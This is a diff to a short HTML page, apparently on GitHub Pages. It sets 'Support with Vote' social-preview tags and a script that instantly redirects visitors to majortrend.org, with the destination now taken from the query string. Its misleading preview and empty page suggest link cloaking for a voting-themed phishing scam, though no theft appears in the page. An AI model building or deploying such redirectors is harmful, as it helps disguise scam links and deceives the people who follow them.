@@ -3,27 +3,24 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="Support with Vote">
   <meta name="twitter:description" content="Support with Vote.">
   <meta name="twitter:image" content="https://majortrending.vote/smg.png">
-
   <meta property="og:title" content="Support with Vote">
   <meta property="og:description" content="Support with Vote.">
   <meta property="og:image" content="https://majortrending.vote/smg.png">
   <meta property="og:url" content="https://majortrending.github.io">
   <meta property="og:type" content="website">
-
   <title>x</title>
-
   <script>
-    const path = window.location.pathname;
-    const target = "https://majortrend.org" + path;
+    const query = window.location.search;
+    const path = query ? query.substring(1) : '';
+    const target = "https://majortrend.org/" + path;
     window.location.replace(target);
   </script>
 </head>
 <body>
-  <p>x...</p>
+  <p>x</p>
 </body>
 </html>
